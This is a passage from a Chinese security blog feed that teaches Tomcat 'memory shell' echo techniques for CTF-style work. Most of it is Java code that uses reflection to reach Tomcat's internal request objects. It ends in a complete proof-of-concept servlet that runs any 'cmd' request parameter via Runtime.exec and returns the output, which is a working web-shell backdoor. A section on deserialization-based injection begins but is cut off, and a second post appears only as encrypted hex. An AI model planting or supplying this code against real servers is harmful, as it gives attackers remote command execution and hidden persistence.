class="string">&quot;context&quot;</span>);</span><br><span class="line">context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> (org.apache.catalina.core.ApplicationContext)context.get(standardContext);</span><br></pre></td></tr></table></figure><h5 id="获取StandardService"><a href="#获取StandardService" class="headerlink" title="获取StandardService"></a>获取StandardService</h5><p>同样使用反射获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取StandardService</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">standardServiceField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">standardServiceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (StandardService) standardServiceField.get(applicationContext);</span><br></pre></td></tr></table></figure><h5 id="获取Connector"><a href="#获取Connector" class="headerlink" title="获取Connector"></a>获取Connector</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取Connector</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">connectorsField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.connector.Connector&quot;</span>).getDeclaredField(<span class="string">&quot;connectors&quot;</span>);</span><br><span class="line">connectorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Connector[] connectors = (Connector[]) connectorsField.get(standardService);</span><br><span class="line"><span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> connectors[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><h5 id="获取Handler"><a href="#获取Handler" class="headerlink" title="获取Handler"></a>获取Handler</h5><p>我们可以通过<code>Connector#getProtocolHandler</code>方法来获取对应的<code>protocolHandler</code></p><p>这里获取的protocolHandler是<code>Http11NioProtocol</code>对象，前面我们分析过了该类继承了<code>AbstractProtocol</code>类，下面我们再通过反射获取Handler——内部类<code>ConnectionHandler</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取Handler</span></span><br><span class="line"><span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connector.getProtocolHandler();</span><br><span class="line"><span class="type">Field</span> <span class="variable">handlerField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">handlerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">org.apache.tomcat.util.net.AbstractEndpoint.<span class="type">Handler</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractEndpoint.Handler) handlerField.get(protocolHandler);</span><br></pre></td></tr></table></figure><h5 id="获取内部类ConnectionHandler的global属性"><a href="#获取内部类ConnectionHandler的global属性" class="headerlink" title="获取内部类ConnectionHandler的global属性"></a>获取<strong>内部类ConnectionHandler的</strong>global属性</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取内部类AbstractProtocol$ConnectionHandler的global属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">globalHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">globalHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">RequestGroupInfo</span> <span class="variable">global</span> <span class="operator">=</span> (RequestGroupInfo) globalHandler.get(handler);</span><br></pre></td></tr></table></figure><h5 id="获取processor"><a href="#获取processor" class="headerlink" title="获取processor"></a>获取processor</h5><p>global属性RequestGroupInfo类中的processors数组用来存储RequestInfo对象，下面我们来获取RequestInfo对象，进而获取request对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取processors</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">processorsField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">processorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);</span><br></pre></td></tr></table></figure><p>最后我们获取request和response对象</p><h5 id="获取request和response"><a href="#获取request和response" class="headerlink" title="获取request和response"></a>获取request和response</h5><p>这里我选择进一步获取<code>org.apache.catalina.connector.Request</code>对象，因为它继承自<code>HttpServletRequest</code>，我们可以通过<code>PrintWrinter</code>类直接获取回显</p><p><img src="../images/图片-112.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取request和response</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">for</span> (RequestInfo requestInfo : requestInfoList)&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//获取org.apache.coyote.Request</span></span><br><span class="line">    org.apache.coyote.<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request</span></span><br><span class="line">    org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">http_request</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) request.getNote(<span class="number">1</span>);</span><br><span class="line">    org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">http_response</span> <span class="operator">=</span> http_request.getResponse();</span><br><span class="line"> </span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> http_response.getWriter();</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> http_request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext()?scanner.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">    scanner.close();</span><br><span class="line">    writer.write(result);</span><br><span class="line">    writer.flush();</span><br><span class="line">    writer.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardService;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.ProtocolHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestGroupInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebServlet(&quot;/response&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tomcat_Echo_Response</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//获取StandardService</span></span><br><span class="line">        org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"> </span><br><span class="line">        System.out.println(standardContext);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取ApplicationContext</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(standardContext);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取StandardService</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">standardServiceField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            standardServiceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (StandardService) standardServiceField.get(applicationContext);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取Connector</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">connectorsField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="string">&quot;connectors&quot;</span>);</span><br><span class="line">            connectorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Connector[] connectors = (Connector[]) connectorsField.get(standardService);</span><br><span class="line">            <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> connectors[<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取Handler</span></span><br><span class="line">            <span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connector.getProtocolHandler();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">handlerField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">            handlerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.tomcat.util.net.AbstractEndpoint.<span class="type">Handler</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractEndpoint.Handler) handlerField.get(protocolHandler);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取内部类AbstractProtocol$ConnectionHandler的global属性</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">globalHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">            globalHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">RequestGroupInfo</span> <span class="variable">global</span> <span class="operator">=</span> (RequestGroupInfo) globalHandler.get(handler);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取processors</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">processorsField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">            processorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取request和response</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">for</span> (RequestInfo requestInfo : requestInfoList)&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//获取org.apache.coyote.Request</span></span><br><span class="line">                org.apache.coyote.<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request</span></span><br><span class="line">                org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">http_request</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) request.getNote(<span class="number">1</span>);</span><br><span class="line">                org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">http_response</span> <span class="operator">=</span> http_request.getResponse();</span><br><span class="line"> </span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> http_response.getWriter();</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> http_request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext()?scanner.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                scanner.close();</span><br><span class="line">                writer.write(result);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里注意一下有点就是 <strong>getResource()</strong> 跟tomcat版本有关     </p><p><img src="../images/image-20230818160323336.png" alt="image-20230818160323336"></p><p><img src="../images/image-20230818161005288.png" alt="image-20230818161005288"></p><p>不给用这里  所以得换一个  tomcat版本</p><p>(这里后面我用的是tomcat 9.0.1版本)</p><p><img src="../images/image-20230818163630398.png" alt="image-20230818163630398"></p><p><img src="../images/image-20230818163642017.png" alt="image-20230818163642017"></p><p><img src="../images/image-20230818163649848.png" alt="image-20230818163649848"></p><p>成功执行</p><h3 id="反序列化注入内存马"><a href="#反序列化注入内存马" class="headerlink" title="反序列化注入内存马"></a>反序列化注入内存马</h3><p>在CTF中，我们注入内存马的目的往往是为了获取不出网机器的回显，而内存马的注入往往是通过反序列化漏洞。下面我们就来聊聊如何通过一个反序列化漏洞来注入内存马。</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>下面我们先来搭建一个存在反序列化漏洞的环境，编写一个存在反序列化漏洞的Servlet。这里JDK版本为<code>jdk8u_65</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1355&quot;&gt;参考文章1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC</summary>
      
    
    
    
    
    <category term="Java-内存马回显技术" scheme="https://ke1nys.github.io/tags/Java-%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>show-Java</title>
    <link href="https://ke1nys.github.io/posts/80cd2c80.html"/>
    <id>https://ke1nys.github.io/posts/80cd2c80.html</id>
    <published>2023-08-06T04:39:35.000Z</published>
    <updated>2023-08-17T09:33:39.370Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="73cd30483b9dbf0da88a72b33e5186350bb4ac400b885c5deba837d8bc627781">1a90164da2a38547586d85c848ea232366b2d39f28f378a80a9367580f0834c7791a23bf6397ceb037ecf4f99edf772ba12fdc06222369dd2343a3df46e26c9f19dd34dc92b8b229d6695f6e68e00caf97edc9dd9d5fcd3f49126aabbd1ab556ff9e510b833729b75e52522d7bb181b2cc9df88b214f37b239aaf7f2d68a0d3eb46a812d0971d7a44a201c12aec06d4f248475df9fbf7a96a80ebe3d434bcac12a8aeda7443dfa550266190a399a10e6b16c28947dbe6792c1db6be01f5b390527fe3051aaa3487a15c3cdc9335df7f58c56f63a1b77257c8757bd19d99c7e10afec8b55381d0965519da5fc59de4e056bf7a36c6b6316a9232358da4d12c5fe3271f1c29754092f8796f8e196a56d769e1f0fdc7d88ac33c21aa1062c34d6a1b39d04dc230d26db466698233fd099aecdd432072d49c758474070f8856386e16f86791e01fb04e0351d3a1e40293bc890839512ec6607e6dd450565e25041fdfb80a0cc94d105dce3f7db8dac0ecc860b39777e58657940c4004e9d7519ea0c0d718efd11f92e8290b79608d597e262620d54c6702c4bfb58a0b66a15986b676a16cea64d19ba1a78b082666d6bf9d823fd01438c26435989a3c30b82ab0ce20c0da9182eaa57f08cec8f4ea9b067a67ade848213de8644e0b3a36de602e9d02e67f842923f5c61b8f8bdbea90a7398334c4253776ed36d80ebca4da1e0905c1b62ca88af8f45ab87b540e0ed810b54ad20061f7f4aecb50caac4bb261cec63404efd0a776ed11988001e275f21591429fee23d911b97528b148e7bb3836ee800de8f6ce87d3124f28e300aeea590d37490fd7b1d83f9a94b810bf1b3165c526102441f121f5d0e51765230a96943046282b63871692d3e31e324f388aecc46e89f0dfe9d12957f2e144e6a60814d466e229398175392e95601c280d674213bb417f5d9c48b0ec16d5cda87b83e405b495b298b2d0b65bc90941b1d5e599383e4fbfef2881367c5411cc1bc5c76e596af5e07760d2327e836a6486d15e8def4976343d35c10a22418bd9847182b71c263081f1196a194a86bf83cb5e2935b6a418765a659e65e9efb36f54917bd6c5fdec3c5e87500b0252448aa2ae62ccd3ec884c74a612e69f78e004401c521b8c2c2283327cb5accdaf641ab91c32f12d7179619537033e22be5f5f991e019671eb92a30175b2e0454f9232e69997a0a08ea440b94170f099839a8a1c243cc88e16156f9718242ecc0fb3a734e1611820461048b4498984ce3a4bad604f72ed8d268619830643f959a0b0b1ccc81294351cea1f139fdf492fa2794855f942b270f94178cb62523a31f4fa6417034cf695e64068d7a5187f1e2e20ccc0b54f0d4a56c7989ef1729513b80a3abf3e344d9ba1dea41795d37cf6ca5c5f53e4c19703c8e2023623ef6e2ec8def7d0bd5ec0ca032d623c37b914ce42435c8e449a9b4e1323a56e19d323b5d3b3097b8c0bcdc0dd9258a4cab7a880a677d1e14a76734b554078ecd8e7be5623e073f3558cf80ea659e9946ca6ea0b0a745315139a90d2ac0e7010d0a094289821cfb63759d3315fa59d5f15a55da28bab24acf776376a928d2a1215d75e33e589a83104c4afe2b2df0f22811a8ade7b56cf72d7084eb21e74b8e5f6de6c08bb6485c4e54720129c2abaca61692d91fc7fc877813c93a7c69602cfb87549213911c1e5d92f27bf88c5664452510c522ae8d42771bef43f7a64362ff45fd339490f2db226346f149f66f17c1289eb4fdd4c1a50fb8c9481ae8518ce4ce348c357ce45d09131c4e31c4f237ce43c6edbd1b18fb94b50087d614b608b2bdada52786e84f6bc3d9656e0205bb7febe6e712a5207a9435d2aa2ff732f72acd9625022960f729bbcf1282858a317101bce9d122f94db3f21f93f771dbcf7bc822382ef6e5f52ef8d0aa598dae9b155b25cfe879e0979e10b699ddc0259480d4fdf776d59325efcac7ae84431d649c711bb4c3165e1aaca6fe56f86312868ecb70bd7eb1c001d601fccc833df17b08d375c86209a4aab4aa972643d536c1189c419dd7b875ba9fdf7c11443e9b1506b5995871e0c1e3828a69e6b1e18185dd2a78d7e9607eddf748db4d01b91983045be23062fae06357d02b2f98d761a15b8a6b58c165a610bc52cfe4d579a4c15738079f4b221700e9b0f04fa39e9e18dcd7cb396cae904c698974f7b8d05fa7b9535eb90ee14981a07b3b0f363b644520c9b5f7131c5bdfd2ae8050645aa82813dbd062df9499e13f34e353be3507fd7432190d9a6597bd7c774a4924c85c82ce3c31ee89ce7f7ce3bf3a7d9ce42ae1396f31b3231634e854d61bea0db1ff2381f7f407d29144b0ddc317baa6828a9c8375177aa7755f9e0d0211e1fefccab297b72209255fe7d0be13e12e4f1afb2a1aa8db7d6144b4ed25d29d52d3b2b1f4ec9e317ac92f398cc22ff2ce6c783276c5bba42e80c7a3f7b35a3914e3cf0bd76051e2fb6111ab01323d03e7687338633f1ccf89f8febdbaeefbbf3c6e3e145b33cf74fbad1e203ea21fd634c4c9873f58c7f2cfa4cde8e5e2b7dfefcf7bf0e29aaf20cccdf9803b54ebc4626e4d8b686b6903557fcbd70ab29e3f5b614388c7b57c385ffb00f776b5e6074ed2d6e62dc10be07e20f3a84ed39bc8e71069956a67a86c2483b55dd74a6cb4cddff0ccd6add6abb37954b8867ce22201a8ce3ed2ef144fb356c6d4de362935b78916d121651585cbff03dc94955add0060c79752a9ed25fcdffdd0d7fc4f121e552a55d0d61bf32a66b0fb8346894bc709dd4228eaff09bc37618a3a859814e3ba7c30649dc1f12035093b1c194ba3ef9138c8affa63149050ec047efc3dd1d09b6cada27c59d778e81048f35640815df97009a42ad7bb17eaeb6d9fffe040700e5c45d25f82c9d290136a5847e1c2155755c0bf63b653b8ed21b566e9a82a18cbc88d76aeb92a467ce77c3376f473bb0377ffa3736ea95bcb76be8da7dedb759e62ebb6ab8d8dd3b256d1929d51c54d53ea932d824fabd5e689e54c9b0c3e4eac443e4cdb7f153bb99895316908d0b7e6f04c9a6d8a5f4f637b2f239f3ad435d88aff866ea4c5a5e14ef93b82e4d5eacc5bd7e30cac2772bc084007a40c45aa0fb5a3f3cd6004c95dc63c9376bd315b96d1b86207c4eb4af6500e1836d2bfce711e903710775a74714d72ec3a7d06d21c8062c447e5d59ba93f1cda750bacbde4170ed3c319a845010eba992a3132f4f7233d4d825ec9dc781aec3b357ce6e07fc6ae9dba02863e9db4343e6146d756f877be1169d0964cd94b66090d39381b8b3064082d5f4ae18efdf04dc6197568cb9ac4c28dc4bc00907f4752a806ea5152b5bbbdc4526934954cad01de7037bd36c2dfe93d8536418011f3cbc2e6a2008d0798a024af1ce5071b054812c523d7b4d56f7cda0751e6ab92652146dcde1105ecc792a99769806e2faa119b6bf9bc1ac22009e55e248af36512c53909837c5d7cb155f8d857a0f193d606b55a8f93988f2195dd55ec6ee59df11eb0f61524f8315a59d1ce79266e082b8be7112b2906196ebfc000890cc0c9f8c43da99ddb8b19ac87cc67fe8695f49edc0bfba3e40af6bbdba62154db63773bd185043c69897872a17ebb63537f9c8c7e6a78c5a24216df9eb08fbcfe311b95b6763b11b773ea889e72c709f003f99f67b417da4fff1e686461a34f0b5fcd7f4726cb0a060ac3b14e149a97b80f3725dc85d4a66ed060ae5b3f108673082cdb347b948407b8a820fb224742563fb9048fe8f328fef4ec7794440e356a9229d037aa7e53f8de7b3f9cf18e666bda73f7ba3d60bdee645689eb4a4052eaec5cb6d3f25b75abdd81006e7ba09fbd91833c51316635dd9bf3e3e244e2d6c2884047d044004dfc83c4342d0a6ec5dc7d87746f4d6bc2805215a8d1257d043fd8ee78240b620086f77fcec378f9859ee58f190a05f76145ff6d48ff8d91877e8c8076b555ac63eb03dc3563acd352d0d2d06e958a893e9d3ff508bcae65af35de2b451ae0e6125582b6e2eca0236e4bf123c8f8f76060274d1fb6e70d71c5bc9d44638079d2821d2d2f930d3b5375c4eccd9e205fbf437c63fde682e77fbdb152338873296296cc8ae7d4f5555d723a94cf38e03ddf5826a9e5d1ce25ec538c728af8ec6790f8e681f89353f92e643e73d7c54ce2d6f023c8f0040998c7ed883fcd92fd2037ad54048d30a146bc69e364e5afd46fb4714db6bf588e51f5285f4816bf524d5b0c678291006a63b1bbb9e107430ac47fc26387ed341af4bca05b2e1f1e9da5a3fd6a9185c58e8721f8ceaa4947a2a9bf3f01c99f1cfca84b46ccff6eb6486a3146dea3367bc38a88e8809230aa7dc98f89f75b9bc6c4aca2323c29a8ad5330363f793d7e4916106666ba81078ba21aafc4df4ca276d4ce1b88bc922facbab723118614f5abc2af532cfb443ffe3ae6026ce1d84fa1cd80406cd618b734e8bc24bd6a0004d392f99dcf76d11944a42909f9ebb39207da928faa51188a45fcb6c3e6a8c520b88e26a148f50d793a6f7a33936cd951774871b335d352792611f649c1847d6bd29d35a20584ceaea2c7eb7cba3e26287ec6e2557bec663c343e1aaf